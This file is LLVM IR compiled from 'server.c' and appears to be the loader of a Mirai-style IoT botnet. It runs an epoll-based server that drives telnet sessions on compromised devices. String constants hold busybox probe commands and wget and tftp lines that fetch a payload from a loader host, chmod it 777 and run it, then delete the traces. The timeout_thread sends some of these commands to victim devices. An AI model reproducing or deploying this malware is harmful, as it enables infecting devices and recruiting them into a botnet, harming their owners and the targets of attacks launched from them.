; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%union.pthread_mutexattr_t = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.cpu_set_t = type { [16 x i64] }

@.str = private unnamed_addr constant [50 x i8] c"Failed to allocate establisted_connections array\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"Failed to allocate connection %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [51 x i8] c"Failed to initialize epoll context. Error code %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"srv == NULL 3\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"fd too big\0A\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"srv == NULL 4\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"got connect error\0A\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"epoll_wait\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"Failed to bind to core %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [20 x i8] c"yo socket mismatch\0A\00", align 1
@.str.10 = private unnamed_addr constant [66 x i8] c"socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\0A\00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"oversized buffer pointer!\0A\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [25 x i8] c"/bin/busybox daddyl33t\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [42 x i8] c"/bin/busybox ps; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [56 x i8] c"/bin/busybox cat /proc/mounts; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"cd %s/\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [108 x i8] c"/bin/busybox cp /bin/echo WsGA4@F6F; >WsGA4@F6F; /bin/busybox chmod 777 WsGA4@F6F; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.22 = private unnamed_addr constant [29 x i8] c"/bin/busybox cat /bin/echo\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [63 x i8] c"/bin/busybox wget; /bin/busybox tftp; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.25 = private unnamed_addr constant [44 x i8] c"cat /proc/cpuinfo; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"/bin/busybox cp WsGA4@F6F 3@AsDACGa; > 3@AsDACGa; /bin/busybox chmod 777 3@AsDACGa; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [121 x i8] c"/bin/busybox wget http://%s:%d/3MaF4G/%s.%s -O - > WsGA4@F6F; /bin/busybox chmod 777 WsGA4@F6F; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"shinto\00", align 1
@.str.29 = private unnamed_addr constant [99 x i8] c"/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 WsGA4@F6F; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"WsGA4@F6F\00", align 1
@.str.31 = private unnamed_addr constant [45 x i8] c"./%s; ./%s %s.echo; /bin/busybox t33lyddad\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"3@AsDACGa\00", align 1
@id_tag = external global i8*, align 8
@.str.33 = private unnamed_addr constant [46 x i8] c"./WsGA4@F6F %s.wget; /bin/busybox t33lyddad\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [46 x i8] c"./WsGA4@F6F %s.tftp; /bin/busybox t33lyddad\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.37 = private unnamed_addr constant [56 x i8] c"rm -rf 3@AsDACGa; > WsGA4@F6F; /bin/busybox daddyl33t\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [21 x i8] c"oversized buffer! 2\0A\00", align 1
@.str.39 = private unnamed_addr constant [41 x i8] c"\03\1Akill %%1\0D\0Arm -rf WsGA4@F6F 3@AsDACGa\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local %struct.server* @server_create(i8 zeroext %0, i8 zeroext %1, i32* %2, i32 %3, i8* %4, i16 zeroext %5, i8* %6) #0 {
  %8 = alloca %struct.server*, align 8
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i8*, align 8
  %16 = alloca %struct.server*, align 8
  %17 = alloca %struct.server_worker*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.server_worker*, align 8
  store i8 %0, i8* %9, align 1
  store i8 %1, i8* %10, align 1
  store i32* %2, i32** %11, align 8
  store i32 %3, i32* %12, align 4
  store i8* %4, i8** %13, align 8
  store i16 %5, i16* %14, align 2
  store i8* %6, i8** %15, align 8
  %20 = call noalias align 16 i8* @calloc(i64 1, i64 96) #8
  %21 = bitcast i8* %20 to %struct.server*
  store %struct.server* %21, %struct.server** %16, align 8
  %22 = load i8, i8* %9, align 1
  %23 = zext i8 %22 to i64
  %24 = call noalias align 16 i8* @calloc(i64 %23, i64 32) #8
  %25 = bitcast i8* %24 to %struct.server_worker*
  store %struct.server_worker* %25, %struct.server_worker** %17, align 8
  %26 = load i8, i8* %10, align 1
  %27 = load %struct.server*, %struct.server** %16, align 8
  %28 = getelementptr inbounds %struct.server, %struct.server* %27, i32 0, i32 17
  store i8 %26, i8* %28, align 1
  %29 = load i32*, i32** %11, align 8
  %30 = load %struct.server*, %struct.server** %16, align 8
  %31 = getelementptr inbounds %struct.server, %struct.server* %30, i32 0, i32 13
  store i32* %29, i32** %31, align 8
  %32 = load i32, i32* %12, align 4
  %33 = load %struct.server*, %struct.server** %16, align 8
  %34 = getelementptr inbounds %struct.server, %struct.server* %33, i32 0, i32 0
  store i32 %32, i32* %34, align 8
  %35 = load i8*, i8** %13, align 8
  %36 = load %struct.server*, %struct.server** %16, align 8
  %37 = getelementptr inbounds %struct.server, %struct.server* %36, i32 0, i32 9
  store i8* %35, i8** %37, align 8
  %38 = load i16, i16* %14, align 2
  %39 = load %struct.server*, %struct.server** %16, align 8
  %40 = getelementptr inbounds %struct.server, %struct.server* %39, i32 0, i32 15
  store i16 %38, i16* %40, align 8
  %41 = load i8*, i8** %15, align 8
  %42 = load %struct.server*, %struct.server** %16, align 8
  %43 = getelementptr inbounds %struct.server, %struct.server* %42, i32 0, i32 10
  store i8* %41, i8** %43, align 8
  %44 = load i32, i32* %12, align 4
  %45 = mul i32 %44, 2
  %46 = zext i32 %45 to i64
  %47 = call noalias align 16 i8* @calloc(i64 %46, i64 8) #8
  %48 = bitcast i8* %47 to %struct.connection**
  %49 = load %struct.server*, %struct.server** %16, align 8
  %50 = getelementptr inbounds %struct.server, %struct.server* %49, i32 0, i32 12
  store %struct.connection** %48, %struct.connection*** %50, align 8
  %51 = load i8, i8* %9, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias align 16 i8* @calloc(i64 %52, i64 32) #8
  %54 = bitcast i8* %53 to %struct.server_worker*
  %55 = load %struct.server*, %struct.server** %16, align 8
  %56 = getelementptr inbounds %struct.server, %struct.server* %55, i32 0, i32 11
  store %struct.server_worker* %54, %struct.server_worker** %56, align 8
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.server*, %struct.server** %16, align 8
  %59 = getelementptr inbounds %struct.server, %struct.server* %58, i32 0, i32 16
  store i8 %57, i8* %59, align 2
  %60 = load %struct.server*, %struct.server** %16, align 8
  %61 = getelementptr inbounds %struct.server, %struct.server* %60, i32 0, i32 12
  %62 = load %struct.connection**, %struct.connection*** %61, align 8
  %63 = icmp eq %struct.connection** %62, null
  br i1 %63, label %64, label %66

64:                                               ; preds = %7
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i64 0, i64 0))
  call void @exit(i32 0) #9
  unreachable

66:                                               ; preds = %7
  store i32 0, i32* %18, align 4
  br label %67

67:                                               ; preds = %102, %66
  %68 = load i32, i32* %18, align 4
  %69 = load i32, i32* %12, align 4
  %70 = mul i32 %69, 2
  %71 = icmp ult i32 %68, %70
  br i1 %71, label %72, label %105

72:                                               ; preds = %67
  %73 = call noalias align 16 i8* @calloc(i64 1, i64 8912) #8
  %74 = bitcast i8* %73 to %struct.connection*
  %75 = load %struct.server*, %struct.server** %16, align 8
  %76 = getelementptr inbounds %struct.server, %struct.server* %75, i32 0, i32 12
  %77 = load %struct.connection**, %struct.connection*** %76, align 8
  %78 = load i32, i32* %18, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.connection*, %struct.connection** %77, i64 %79
  store %struct.connection* %74, %struct.connection** %80, align 8
  %81 = load %struct.server*, %struct.server** %16, align 8
  %82 = getelementptr inbounds %struct.server, %struct.server* %81, i32 0, i32 12
  %83 = load %struct.connection**, %struct.connection*** %82, align 8
  %84 = load i32, i32* %18, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.connection*, %struct.connection** %83, i64 %85
  %87 = load %struct.connection*, %struct.connection** %86, align 8
  %88 = icmp eq %struct.connection* %87, null
  br i1 %88, label %89, label %92

89:                                               ; preds = %72
  %90 = load i32, i32* %18, align 4
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i32 %90)
  call void @exit(i32 -1) #9
  unreachable

92:                                               ; preds = %72
  %93 = load %struct.server*, %struct.server** %16, align 8
  %94 = getelementptr inbounds %struct.server, %struct.server* %93, i32 0, i32 12
  %95 = load %struct.connection**, %struct.connection*** %94, align 8
  %96 = load i32, i32* %18, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.connection*, %struct.connection** %95, i64 %97
  %99 = load %struct.connection*, %struct.connection** %98, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 0
  %101 = call i32 @pthread_mutex_init(%union.pthread_mutex_t* %100, %union.pthread_mutexattr_t* null) #8
  br label %102

102:                                              ; preds = %92
  %103 = load i32, i32* %18, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %18, align 4
  br label %67, !llvm.loop !6

105:                                              ; preds = %67
  store i32 0, i32* %18, align 4
  br label %106

106:                                              ; preds = %145, %105
  %107 = load i32, i32* %18, align 4
  %108 = load i8, i8* %9, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %148

111:                                              ; preds = %106
  %112 = load %struct.server*, %struct.server** %16, align 8
  %113 = getelementptr inbounds %struct.server, %struct.server* %112, i32 0, i32 11
  %114 = load %struct.server_worker*, %struct.server_worker** %113, align 8
  %115 = load i32, i32* %18, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %114, i64 %116
  store %struct.server_worker* %117, %struct.server_worker** %19, align 8
  %118 = load %struct.server*, %struct.server** %16, align 8
  %119 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %120 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %119, i32 0, i32 0
  store %struct.server* %118, %struct.server** %120, align 8
  %121 = load i32, i32* %18, align 4
  %122 = trunc i32 %121 to i8
  %123 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %124 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %123, i32 0, i32 3
  store i8 %122, i8* %124, align 8
  %125 = call i32 @epoll_create1(i32 0) #8
  %126 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %127 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %126, i32 0, i32 1
  store i32 %125, i32* %127, align 8
  %128 = icmp eq i32 %125, -1
  br i1 %128, label %129, label %139

129:                                              ; preds = %111
  %130 = call i32* @__errno_location() #10
  %131 = load i32, i32* %130, align 4
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.2, i64 0, i64 0), i32 %131)
  %133 = load %struct.server*, %struct.server** %16, align 8
  %134 = getelementptr inbounds %struct.server, %struct.server* %133, i32 0, i32 11
  %135 = load %struct.server_worker*, %struct.server_worker** %134, align 8
  %136 = bitcast %struct.server_worker* %135 to i8*
  call void @free(i8* %136) #8
  %137 = load %struct.server*, %struct.server** %16, align 8
  %138 = bitcast %struct.server* %137 to i8*
  call void @free(i8* %138) #8
  store %struct.server* null, %struct.server** %8, align 8
  br label %155

139:                                              ; preds = %111
  %140 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %141 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %140, i32 0, i32 2
  %142 = load %struct.server_worker*, %struct.server_worker** %19, align 8
  %143 = bitcast %struct.server_worker* %142 to i8*
  %144 = call i32 @pthread_create(i64* %141, %union.pthread_attr_t* null, i8* (i8*)* @worker, i8* %143) #8
  br label %145

145:                                              ; preds = %139
  %146 = load i32, i32* %18, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %18, align 4
  br label %106, !llvm.loop !8

148:                                              ; preds = %106
  %149 = load %struct.server*, %struct.server** %16, align 8
  %150 = getelementptr inbounds %struct.server, %struct.server* %149, i32 0, i32 14
  %151 = load %struct.server*, %struct.server** %16, align 8
  %152 = bitcast %struct.server* %151 to i8*
  %153 = call i32 @pthread_create(i64* %150, %union.pthread_attr_t* null, i8* (i8*)* @timeout_thread, i8* %152) #8
  %154 = load %struct.server*, %struct.server** %16, align 8
  store %struct.server* %154, %struct.server** %8, align 8
  br label %155

155:                                              ; preds = %148, %129
  %156 = load %struct.server*, %struct.server** %8, align 8
  ret %struct.server* %156
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

declare i32 @printf(i8*, ...) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

; Function Attrs: nounwind
declare i32 @pthread_mutex_init(%union.pthread_mutex_t*, %union.pthread_mutexattr_t*) #1

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @worker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.server_worker*, align 8
  %4 = alloca [128 x %struct.epoll_event], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = bitcast i8* %7 to %struct.server_worker*
  store %struct.server_worker* %8, %struct.server_worker** %3, align 8
  %9 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %10 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 8
  %12 = zext i8 %11 to i32
  call void @bind_core(i32 %12)
  br label %13

13:                                               ; preds = %1, %35
  %14 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %15 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %14, i32 0, i32 1
  %16 = load i32, i32* %15, align 8
  %17 = getelementptr inbounds [128 x %struct.epoll_event], [128 x %struct.epoll_event]* %4, i64 0, i64 0
  %18 = call i32 @epoll_wait(i32 %16, %struct.epoll_event* %17, i32 127, i32 -1)
  store i32 %18, i32* %6, align 4
  %19 = load i32, i32* %6, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

21:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0))
  br label %22

22:                                               ; preds = %21, %13
  store i32 0, i32* %5, align 4
  br label %23

23:                                               ; preds = %32, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %6, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %35

27:                                               ; preds = %23
  %28 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [128 x %struct.epoll_event], [128 x %struct.epoll_event]* %4, i64 0, i64 %30
  call void @handle_event(%struct.server_worker* %28, %struct.epoll_event* %31)
  br label %32

32:                                               ; preds = %27
  %33 = load i32, i32* %5, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %5, align 4
  br label %23, !llvm.loop !9

35:                                               ; preds = %23
  br label %13
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @timeout_thread(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.server*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.connection*, align 8
  store i8* %0, i8** %2, align 8
  %7 = load i8*, i8** %2, align 8
  %8 = bitcast i8* %7 to %struct.server*
  store %struct.server* %8, %struct.server** %3, align 8
  br label %9

9:                                                ; preds = %1, %147
  %10 = call i64 @time(i64* null) #8
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %5, align 4
  store i32 0, i32* %4, align 4
  br label %12

12:                                               ; preds = %144, %9
  %13 = load i32, i32* %4, align 4
  %14 = load %struct.server*, %struct.server** %3, align 8
  %15 = getelementptr inbounds %struct.server, %struct.server* %14, i32 0, i32 0
  %16 = load i32, i32* %15, align 8
  %17 = mul i32 %16, 2
  %18 = icmp ult i32 %13, %17
  br i1 %18, label %19, label %147

19:                                               ; preds = %12
  %20 = load %struct.server*, %struct.server** %3, align 8
  %21 = getelementptr inbounds %struct.server, %struct.server* %20, i32 0, i32 12
  %22 = load %struct.connection**, %struct.connection*** %21, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.connection*, %struct.connection** %22, i64 %24
  %26 = load %struct.connection*, %struct.connection** %25, align 8
  store %struct.connection* %26, %struct.connection** %6, align 8
  %27 = load %struct.connection*, %struct.connection** %6, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 11
  %29 = load i8, i8* %28, align 4
  %30 = sext i8 %29 to i32
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %110

32:                                               ; preds = %19
  %33 = load %struct.connection*, %struct.connection** %6, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 6
  %35 = load i64, i64* %34, align 8
  %36 = icmp sgt i64 %35, 0
  br i1 %36, label %37, label %110

37:                                               ; preds = %32
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = load %struct.connection*, %struct.connection** %6, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 6
  %42 = load i64, i64* %41, align 8
  %43 = sub nsw i64 %39, %42
  %44 = load %struct.connection*, %struct.connection** %6, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 10
  %46 = load i16, i16* %45, align 2
  %47 = zext i16 %46 to i64
  %48 = icmp sgt i64 %43, %47
  br i1 %48, label %49, label %110

49:                                               ; preds = %37
  %50 = load %struct.connection*, %struct.connection** %6, align 8
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %50, i32 0, i32 7
  %52 = load i32, i32* %51, align 8
  %53 = icmp eq i32 %52, 18
  br i1 %53, label %54, label %107

54:                                               ; preds = %49
  %55 = load %struct.connection*, %struct.connection** %6, align 8
  %56 = getelementptr inbounds %struct.connection, %struct.connection* %55, i32 0, i32 14
  %57 = load i8, i8* %56, align 1
  %58 = icmp ne i8 %57, 0
  br i1 %58, label %107, label %59

59:                                               ; preds = %54
  %60 = load %struct.connection*, %struct.connection** %6, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 3
  %62 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %61, i32 0, i32 2
  %63 = getelementptr inbounds [6 x i8], [6 x i8]* %62, i64 0, i64 0
  %64 = call i32 @strncmp(i8* %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0), i64 3) #11
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %107

66:                                               ; preds = %59
  %67 = call i64 @time(i64* null) #8
  %68 = load %struct.connection*, %struct.connection** %6, align 8
  %69 = getelementptr inbounds %struct.connection, %struct.connection* %68, i32 0, i32 6
  store i64 %67, i64* %69, align 8
  %70 = load %struct.connection*, %struct.connection** %6, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 4
  %72 = load i32, i32* %71, align 8
  %73 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %72, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i64 0, i64 0))
  %74 = load %struct.connection*, %struct.connection** %6, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 14
  store i8 1, i8* %75, align 1
  %76 = load %struct.connection*, %struct.connection** %6, align 8
  %77 = getelementptr inbounds %struct.connection, %struct.connection* %76, i32 0, i32 5
  store i32 0, i32* %77, align 4
  %78 = load %struct.connection*, %struct.connection** %6, align 8
  %79 = getelementptr inbounds %struct.connection, %struct.connection* %78, i32 0, i32 3
  %80 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %79, i32 0, i32 2
  %81 = getelementptr inbounds [6 x i8], [6 x i8]* %80, i64 0, i64 0
  %82 = load %struct.connection*, %struct.connection** %6, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 3
  %84 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %83, i32 0, i32 2
  %85 = getelementptr inbounds [6 x i8], [6 x i8]* %84, i64 0, i64 3
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp eq i32 %87, 0
  %89 = zext i1 %88 to i64
  %90 = select i1 %88, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)
  %91 = call i8* @strcpy(i8* %81, i8* %90) #8
  %92 = load %struct.connection*, %struct.connection** %6, align 8
  %93 = getelementptr inbounds %struct.connection, %struct.connection* %92, i32 0, i32 3
  %94 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %93, i32 0, i32 2
  %95 = getelementptr inbounds [6 x i8], [6 x i8]* %94, i64 0, i64 0
  %96 = call %struct.binary* @binary_get_by_arch(i8* %95)
  %97 = load %struct.connection*, %struct.connection** %6, align 8
  %98 = getelementptr inbounds %struct.connection, %struct.connection* %97, i32 0, i32 2
  store %struct.binary* %96, %struct.binary** %98, align 8
  %99 = load %struct.connection*, %struct.connection** %6, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 4
  %101 = load i32, i32* %100, align 8
  %102 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %101, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.23, i64 0, i64 0))
  %103 = load %struct.connection*, %struct.connection** %6, align 8
  %104 = getelementptr inbounds %struct.connection, %struct.connection* %103, i32 0, i32 7
  store i32 14, i32* %104, align 8
  %105 = load %struct.connection*, %struct.connection** %6, align 8
  %106 = getelementptr inbounds %struct.connection, %struct.connection* %105, i32 0, i32 13
  store i8 1, i8* %106, align 2
  br label %109

107:                                              ; preds = %59, %54, %49
  %108 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %108)
  br label %109

109:                                              ; preds = %107, %66
  br label %143

110:                                              ; preds = %37, %32, %19
  %111 = load %struct.connection*, %struct.connection** %6, align 8
  %112 = getelementptr inbounds %struct.connection, %struct.connection* %111, i32 0, i32 11
  %113 = load i8, i8* %112, align 4
  %114 = sext i8 %113 to i32
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %116, label %142

116:                                              ; preds = %110
  %117 = load %struct.connection*, %struct.connection** %6, align 8
  %118 = getelementptr inbounds %struct.connection, %struct.connection* %117, i32 0, i32 8
  %119 = getelementptr inbounds %struct.anon, %struct.anon* %118, i32 0, i32 1
  %120 = load i32, i32* %119, align 4
  %121 = icmp ne i32 %120, 0
  br i1 %121, label %122, label %142

122:                                              ; preds = %116
  %123 = call i64 @time(i64* null) #8
  %124 = load %struct.connection*, %struct.connection** %6, align 8
  %125 = getelementptr inbounds %struct.connection, %struct.connection* %124, i32 0, i32 8
  %126 = getelementptr inbounds %struct.anon, %struct.anon* %125, i32 0, i32 1
  %127 = load i32, i32* %126, align 4
  %128 = sext i32 %127 to i64
  %129 = icmp sgt i64 %123, %128
  br i1 %129, label %130, label %142

130:                                              ; preds = %122
  %131 = load %struct.connection*, %struct.connection** %6, align 8
  %132 = getelementptr inbounds %struct.connection, %struct.connection* %131, i32 0, i32 8
  %133 = getelementptr inbounds %struct.anon, %struct.anon* %132, i32 0, i32 1
  store i32 0, i32* %133, align 4
  %134 = load %struct.connection*, %struct.connection** %6, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 4
  %136 = load i32, i32* %135, align 8
  %137 = load %struct.connection*, %struct.connection** %6, align 8
  %138 = getelementptr inbounds %struct.connection, %struct.connection* %137, i32 0, i32 8
  %139 = getelementptr inbounds %struct.anon, %struct.anon* %138, i32 0, i32 0
  %140 = getelementptr inbounds [512 x i8], [512 x i8]* %139, i64 0, i64 0
  %141 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %136, i8* %140)
  br label %142

142:                                              ; preds = %130, %122, %116, %110
  br label %143

143:                                              ; preds = %142, %109
  br label %144

144:                                              ; preds = %143
  %145 = load i32, i32* %4, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %4, align 4
  br label %12, !llvm.loop !10

147:                                              ; preds = %12
  %148 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  br label %9
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_destroy(%struct.server* %0) #0 {
  %2 = alloca %struct.server*, align 8
  store %struct.server* %0, %struct.server** %2, align 8
  %3 = load %struct.server*, %struct.server** %2, align 8
  %4 = icmp eq %struct.server* %3, null
  br i1 %4, label %5, label %6

5:                                                ; preds = %1
  br label %29

6:                                                ; preds = %1
  %7 = load %struct.server*, %struct.server** %2, align 8
  %8 = getelementptr inbounds %struct.server, %struct.server* %7, i32 0, i32 13
  %9 = load i32*, i32** %8, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %16

11:                                               ; preds = %6
  %12 = load %struct.server*, %struct.server** %2, align 8
  %13 = getelementptr inbounds %struct.server, %struct.server* %12, i32 0, i32 13
  %14 = load i32*, i32** %13, align 8
  %15 = bitcast i32* %14 to i8*
  call void @free(i8* %15) #8
  br label %16

16:                                               ; preds = %11, %6
  %17 = load %struct.server*, %struct.server** %2, align 8
  %18 = getelementptr inbounds %struct.server, %struct.server* %17, i32 0, i32 11
  %19 = load %struct.server_worker*, %struct.server_worker** %18, align 8
  %20 = icmp ne %struct.server_worker* %19, null
  br i1 %20, label %21, label %26

21:                                               ; preds = %16
  %22 = load %struct.server*, %struct.server** %2, align 8
  %23 = getelementptr inbounds %struct.server, %struct.server* %22, i32 0, i32 11
  %24 = load %struct.server_worker*, %struct.server_worker** %23, align 8
  %25 = bitcast %struct.server_worker* %24 to i8*
  call void @free(i8* %25) #8
  br label %26

26:                                               ; preds = %21, %16
  %27 = load %struct.server*, %struct.server** %2, align 8
  %28 = bitcast %struct.server* %27 to i8*
  call void @free(i8* %28) #8
  br label %29

29:                                               ; preds = %26, %5
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
